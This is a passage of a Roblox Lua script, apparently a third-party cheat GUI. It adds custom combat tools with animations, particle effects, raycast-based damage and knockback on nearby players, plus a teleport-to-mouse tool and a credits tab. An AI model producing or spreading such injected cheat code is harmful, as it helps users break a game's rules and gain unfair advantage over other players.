stoic1.Parent = game.Players.LocalPlayer.Character["Torso"]
    for _, child in ipairs(stoic1:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
        end
wait(0.1)
local stoic2 = game.ReplicatedStorage.Resources.StoicBomb["Main"].Part.Attachment:Clone()
stoic2.Parent = game.Players.LocalPlayer.Character["Torso"]
    for _, child in ipairs(stoic2:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
        end
wait(0.1)
light1:Destroy()
stoic1:Destroy()
stoic2:Destroy()
local boom2 = game.ReplicatedStorage.Resources.KJEffects["stoic bomb boom entrance"].THEACTUALBOOM:Clone()
boom2.Parent = game.Players.LocalPlayer.Character["Torso"]
    for _, child in ipairs(boom2:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(5) -- Emit 20 particles
        end
    end
local boom3 = game.ReplicatedStorage.Resources.KJEffects["stoic bomb boom entrance"].smok:Clone()
boom3.Parent = game.Players.LocalPlayer.Character["Torso"]
    for _, child in ipairs(boom3:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(5) -- Emit 20 particles
        end
    end
local boom4 = game.ReplicatedStorage.Resources.KJEffects["stoicbombspeedlines"].Attachment:Clone()
boom4.Parent = game.Players.LocalPlayer.Character["Torso"]
    for _, child in ipairs(boom4:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
    end
wait(1)
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
end
-- Add functionality to the tool when activated
tool.Equipped:Connect(function()
    activateTool()
end)

-- Add the tool to the player's backpack
tool.Parent = game.Players.LocalPlayer.Backpack
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Speed of light",
	Callback = function()
      		local Players = game:GetService("Players")
local player = Players.LocalPlayer

if player and player:FindFirstChild("Backpack") then
    local backpack = player.Backpack
    
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            item:Destroy()
        end
    end
end

-- Create the Tool instance
local tool = Instance.new("Tool")
tool.Name = "Energized Punches"
tool.RequiresHandle = false
tool.CanBeDropped = true
tool.ToolTip = "*furiously barrages*"

-- Animation IDs
local mainAnimationId = "rbxassetid://10466974800"
local pushBackAnimationId = "rbxassetid://10471478869"

-- Damage parameters
local minDamage = 5
local maxDamage = 10
local pushBackDistance = 15

-- Function to play an animation
local function playAnimation(animationId, humanoid)
    local animation = Instance.new("Animation")
    animation.AnimationId = animationId
    local animationTrack = humanoid:LoadAnimation(animation)
    animationTrack:Play()
    animationTrack:AdjustSpeed(5)
    return animationTrack
end

-- Function to play the push-back animation
local function playPushBackAnimation(humanoid)
    local pushBackAnimation = Instance.new("Animation")
    pushBackAnimation.AnimationId = pushBackAnimationId
    local pushBackAnimationTrack = humanoid:LoadAnimation(pushBackAnimation)
    pushBackAnimationTrack:Play()
end

-- Connect tool activation event
    tool.Equipped:Connect(function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    
    -- Check if there is a player in front
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    local lookDirection = humanoidRootPart.CFrame.LookVector
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {character}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    local raycastResult = workspace:Raycast(humanoidRootPart.Position, lookDirection * 20, raycastParams)
    
    if raycastResult and raycastResult.Instance and raycastResult.Instance.Parent:FindFirstChild("Humanoid") then
        -- There is a player in front, play secondary animation after 0.7 seconds
        local hitCharacter = raycastResult.Instance.Parent
        local hitHumanoidRootPart = hitCharacter:FindFirstChild("HumanoidRootPart")
        local hitHumanoid = hitCharacter:FindFirstChild("Humanoid")
        
        if hitHumanoidRootPart and hitHumanoid then
            -- Play the main animation immediately
            local mainAnimationTrack = playAnimation(mainAnimationId, humanoid)
            
            -- Apply damage and push back after the delay
            local damage = math.random(minDamage, maxDamage)
            hitHumanoid:TakeDamage(damage)
            local pushBackDirection = (hitHumanoidRootPart.Position - humanoidRootPart.Position).unit
            local pushBackForce = pushBackDirection * pushBackDistance
            hitHumanoidRootPart.Velocity = pushBackForce
            playPushBackAnimation(hitHumanoid)  -- Play push-back animation
            print("Dealt " .. damage .. " damage, pushed back player, and played push-back animation on player: " .. hitCharacter.Name)
        end
        local soundeffect = Instance.new("Sound")
    soundeffect.SoundId = "rbxassetid://17799049330"
    soundeffect.Parent = game.Players.LocalPlayer.Character.Torso
    soundeffect:Play()
    soundeffect.Volume = 1
    wait(0.3)
    soundeffect:Stop()
    else
        -- No player found in front, just play main animation
        print("No player found in front.")
        playAnimation(mainAnimationId, humanoid)
    end
end)

-- Add the tool to the player's backpack
tool.Parent = game.Players.LocalPlayer.Backpack


-- Create the Tool instance
local tool = Instance.new("Tool")
tool.Name = "Shooter"
tool.RequiresHandle = false
tool.CanBeDropped = true
tool.ToolTip = "*pulls out your arm*"

-- Animation IDs
local mainAnimationId = "rbxassetid://13073745835"
local pushBackAnimationId = "rbxassetid://10471478869"

-- Damage parameters
local minDamage = 15
local maxDamage = 20
local pushBackDistance = 20

-- Function to play an animation
local function playAnimation(animationId, humanoid)
    local animation = Instance.new("Animation")
    animation.AnimationId = animationId
    local animationTrack = humanoid:LoadAnimation(animation)
    animationTrack:Play()
    animationTrack:AdjustSpeed(5)
    wait(0.1)
    animationTrack:AdjustSpeed(1)
    wait(0.4)
    local hit1 = game.ReplicatedStorage.Resources.KJEffects["HitParticles"].Hit:Clone()
    hit1.Parent = game.Players.LocalPlayer.Character["Right Arm"]
    for _, child in ipairs(hit1:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(50) -- Emit 20 particles
        end
    end
    return animationTrack
end

-- Function to play the push-back animation
local function playPushBackAnimation(humanoid)
    local pushBackAnimation = Instance.new("Animation")
    pushBackAnimation.AnimationId = pushBackAnimationId
    local pushBackAnimationTrack = humanoid:LoadAnimation(pushBackAnimation)
    pushBackAnimationTrack:Play()
end

-- Connect tool activation event
tool.Equipped:Connect(function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    
    -- Check if there is a player in front
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    local lookDirection = humanoidRootPart.CFrame.LookVector
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {character}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    local raycastResult = workspace:Raycast(humanoidRootPart.Position, lookDirection * 20, raycastParams)
    
    if raycastResult and raycastResult.Instance and raycastResult.Instance.Parent:FindFirstChild("Humanoid") then
        -- There is a player in front, play secondary animation after 0.7 seconds
        local hitCharacter = raycastResult.Instance.Parent
        local hitHumanoidRootPart = hitCharacter:FindFirstChild("HumanoidRootPart")
        local hitHumanoid = hitCharacter:FindFirstChild("Humanoid")
        
        if hitHumanoidRootPart and hitHumanoid then
            -- Play the main animation immediately
            local mainAnimationTrack = playAnimation(mainAnimationId, humanoid)
            
            -- Apply damage and push back after the delay
            local damage = math.random(minDamage, maxDamage)
            hitHumanoid:TakeDamage(damage)
            local pushBackDirection = (hitHumanoidRootPart.Position - humanoidRootPart.Position).unit
            local pushBackForce = pushBackDirection * pushBackDistance
            hitHumanoidRootPart.Velocity = pushBackForce
            playPushBackAnimation(hitHumanoid)  -- Play push-back animation
            print("Dealt " .. damage .. " damage, pushed back player, and played push-back animation on player: " .. hitCharacter.Name)
        end
        local soundeffect = Instance.new("Sound")
    soundeffect.SoundId = "rbxassetid://17325540665"
    soundeffect.Parent = game.Players.LocalPlayer.Character.Torso
    soundeffect:Play()
    soundeffect.Volume = 1
    else
        -- No player found in front, just play main animation
        print("No player found in front.")
        playAnimation(mainAnimationId, humanoid)
        local soundeffect = Instance.new("Sound")
    soundeffect.SoundId = "rbxassetid://17325540665"
    soundeffect.Parent = game.Players.LocalPlayer.Character.Torso
    soundeffect:Play()
    soundeffect.Volume = 1
    end
end)

-- Add the tool to the player's backpack
tool.Parent = game.Players.LocalPlayer.Backpack


-- Create the Tool instance
local tool = Instance.new("Tool")
tool.Name = "Time Travel Fighting"
tool.RequiresHandle = false
tool.CanBeDropped = true
tool.ToolTip = "weakest dummy fight back"

-- Animation IDs
local mainAnimationId = "rbxassetid://18440406788"
local pushBackAnimationId = "rbxassetid://18440398084"

-- Damage parameters
local minDamage = 20
local maxDamage = 25
local pushBackDistance = 30

-- Function to play an animation
local function playAnimation(animationId, humanoid)
    local animation = Instance.new("Animation")
    animation.AnimationId = animationId
    local animationTrack = humanoid:LoadAnimation(animation)
    animationTrack:Play()
    animationTrack:AdjustSpeed(20)
    wait(0.5)
    return animationTrack
end

-- Function to play the push-back animation
local function playPushBackAnimation(humanoid)
    local pushBackAnimation = Instance.new("Animation")
    pushBackAnimation.AnimationId = pushBackAnimationId
    local pushBackAnimationTrack = humanoid:LoadAnimation(pushBackAnimation)
    pushBackAnimationTrack:Play()
    pushBackAnimationTrack:AdjustSpeed(10)
    wait(0.5)
    pushBackAnimationTrack:AdjustSpeed(1)
end

-- Connect tool activation event
tool.Equipped:Connect(function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    
    -- Check if there is a player in front
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    local lookDirection = humanoidRootPart.CFrame.LookVector
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {character}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    local raycastResult = workspace:Raycast(humanoidRootPart.Position, lookDirection * 20, raycastParams)
    
    if raycastResult and raycastResult.Instance and raycastResult.Instance.Parent:FindFirstChild("Humanoid") then
        -- There is a player in front, play secondary animation after 0.7 seconds
        local hitCharacter = raycastResult.Instance.Parent
        local hitHumanoidRootPart = hitCharacter:FindFirstChild("HumanoidRootPart")
        local hitHumanoid = hitCharacter:FindFirstChild("Humanoid")
        
        if hitHumanoidRootPart and hitHumanoid then
            -- Play the main animation immediately
            local mainAnimationTrack = playAnimation(mainAnimationId, humanoid)
            
            -- Apply damage and push back after the delay
            local damage = math.random(minDamage, maxDamage)
            hitHumanoid:TakeDamage(damage)
            local pushBackDirection = (hitHumanoidRootPart.Position - humanoidRootPart.Position).unit
            local pushBackForce = pushBackDirection * pushBackDistance
            hitHumanoidRootPart.Velocity = pushBackForce
            playPushBackAnimation(hitHumanoid)  -- Play push-back animation
            print("Dealt " .. damage .. " damage, pushed back player, and played push-back animation on player: " .. hitCharacter.Name)
        end
    else
        -- No player found in front, just play main animation
        print("No player found in front.")
        playAnimation(mainAnimationId, humanoid)
    end
end)

-- Add the tool to the player's backpack
tool.Parent = game.Players.LocalPlayer.Backpack

-- Create the Tool instance
local tool = Instance.new("Tool")
tool.Name = "Running Fists"
tool.RequiresHandle = false
tool.CanBeDropped = true
tool.ToolTip = "take this you little wimp"

-- Animation IDs
local mainAnimationId = "rbxassetid://13560306510"
local pushBackAnimationId = "rbxassetid://10471478869"

-- Damage parameters
local minDamage = 10
local maxDamage = 15
local pushBackDistance = 15

-- Function to play an animation
local function playAnimation(animationId, humanoid)
    local animation = Instance.new("Animation")
    animation.AnimationId = animationId
    local animationTrack = humanoid:LoadAnimation(animation)
    animationTrack:Play()
    animationTrack:AdjustSpeed(10)
    wait(0.35)
    return animationTrack
end

-- Function to play the push-back animation
local function playPushBackAnimation(humanoid)
    local pushBackAnimation = Instance.new("Animation")
    pushBackAnimation.AnimationId = pushBackAnimationId
    local pushBackAnimationTrack = humanoid:LoadAnimation(pushBackAnimation)
    pushBackAnimationTrack:Play()
end

-- Connect tool activation event
tool.Equipped:Connect(function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    
    -- Check if there is a player in front
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    local lookDirection = humanoidRootPart.CFrame.LookVector
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {character}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    local raycastResult = workspace:Raycast(humanoidRootPart.Position, lookDirection * 20, raycastParams)
    
    if raycastResult and raycastResult.Instance and raycastResult.Instance.Parent:FindFirstChild("Humanoid") then
        -- There is a player in front, play secondary animation after 0.7 seconds
        local hitCharacter = raycastResult.Instance.Parent
        local hitHumanoidRootPart = hitCharacter:FindFirstChild("HumanoidRootPart")
        local hitHumanoid = hitCharacter:FindFirstChild("Humanoid")
        
        if hitHumanoidRootPart and hitHumanoid then
            -- Play the main animation immediately
            local mainAnimationTrack = playAnimation(mainAnimationId, humanoid)
            
            -- Apply damage and push back after the delay
            local damage = math.random(minDamage, maxDamage)
            hitHumanoid:TakeDamage(damage)
            local pushBackDirection = (hitHumanoidRootPart.Position - humanoidRootPart.Position).unit
            local pushBackForce = pushBackDirection * pushBackDistance
            hitHumanoidRootPart.Velocity = pushBackForce
            playPushBackAnimation(hitHumanoid)  -- Play push-back animation
            print("Dealt " .. damage .. " damage, pushed back player, and played push-back animation on player: " .. hitCharacter.Name)
        end
    else
        -- No player found in front, just play main animation
        print("No player found in front.")
        playAnimation(mainAnimationId, humanoid)
    end
end)

-- Add the tool to the player's backpack
tool.Parent = game.Players.LocalPlayer.Backpack

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local AnimationId = "rbxassetid://15957361339"
local SoundId = "rbxassetid://15956555583"


local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Mouse = LocalPlayer:GetMouse()
local Humanoid = Character:WaitForChild("Humanoid")
local Torso = Character:WaitForChild("Torso")


local TweenSpeed = 100000


local CooldownTime = 0.9
local LastActivated = 0


local animation = Instance.new("Animation")
animation.AnimationId = AnimationId


local animTrack = Humanoid:LoadAnimation(animation)


local tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Velocity Manipulate"
tool.ManualActivationOnly = false


local sound = Instance.new("Sound")
sound.SoundId = SoundId
sound.Volume = 1
sound.Parent = Character.HumanoidRootPart


function tweenTeleport(to, speed)
    local rootPart = Character.HumanoidRootPart
    local distance = (to.Position - rootPart.Position).Magnitude
    local tweenInfo = TweenInfo.new(distance / speed, Enum.EasingStyle.Linear)
    
    local tween = TweenService:Create(rootPart, tweenInfo, {
        CFrame = to
    })


    tween:Play()
    tween.Completed:Wait()
end


local function findDescendant(parent, name)
    local child = parent:FindFirstChild(name)
    if not child then
        for _, descendant in ipairs(parent:GetChildren()) do
            child = findDescendant(descendant, name)
            if child then
                break
            end
        end
    end
    return child
end


local function duplicateEmitter(originalEmitter)
    local duplicate = originalEmitter:Clone()
    duplicate.Parent = originalEmitter.Parent
    duplicate.Rate = 100
    return duplicate
end


tool.Equipped:Connect(function()
    local currentTime = tick()


    if currentTime - LastActivated >= CooldownTime then
        LastActivated = currentTime


        local position = Mouse.Hit + Vector3.new(0, 2.5, 0)
        tweenTeleport(CFrame.new(position.X, position.Y, position.Z), TweenSpeed)
        
        animTrack:Play()
        
        sound:Play()
        
        local replicatedStorage = game:GetService("ReplicatedStorage")
        local resourcesFolder = replicatedStorage:WaitForChild("Resources", 2)
        if resourcesFolder then
            local kjEffectsFolder = resourcesFolder:FindFirstChild("KJEffects")
            if kjEffectsFolder then
                local tpThingEmitter = findDescendant(kjEffectsFolder, "tpthing")
                if tpThingEmitter and tpThingEmitter:IsA("ParticleEmitter") then
                    local duplicatedEmitter = duplicateEmitter(tpThingEmitter)
                    
                    duplicatedEmitter.Parent = Torso
                    print("Successfully parented duplicated tpthing ParticleEmitter to Torso and set Rate to 100.")
                    
                    wait(0.2)
                    
                    duplicatedEmitter.Rate = 0
                    print("Successfully set Rate of duplicated emitter to 0 after 0.2 seconds.")
                else
                    warn("Could not find tpthing ParticleEmitter or it is not a ParticleEmitter.")
                end
            else
                warn("Could not find KJEffects folder inside Resources.")
            end
        else
            warn("Could not find Resources folder inside ReplicatedStorage.")
        end
    end
end)


tool.Parent = LocalPlayer.Backpack

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local function findGuiAndSetText()
    local screenGui = playerGui:FindFirstChild("ScreenGui")
    if screenGui then
        local magicHealthFrame = screenGui:FindFirstChild("MagicHealth")
        if magicHealthFrame then
            local textLabel = magicHealthFrame:FindFirstChild("TextLabel")
            if textLabel then
                textLabel.Text = "SPEED OF LIGHT"
            end
        end
    end
end


playerGui.DescendantAdded:Connect(findGuiAndSetText)
findGuiAndSetText()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]    

local Tab = Window:MakeTab({
	Name = "Credits",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Section = Tab:AddSection({
	Name = "Respected people"
})

--[[
Name = <string> - The name of the section.
]]

Tab:AddButton({
	Name = "owner - Bonbon",
	Callback = function()
      		print("theonethathasnoenemies")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Dragon - Helper - bonbon's boner",
	Callback = function()
      		print("dragonfly50101")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Ccure - Helper - Script adder",
	Callback = function()
      		print("kaguyafan3")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Korosanii - Early access gui tester",
	Callback = function()
      		print("korosanii")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "sdak/Ya - Whitelisted ppl",
	Callback = function()
      		print("sdak47")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Joshuaa - #2 whitelisted person",
	Callback = function()
      		print("Joshuaaa")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]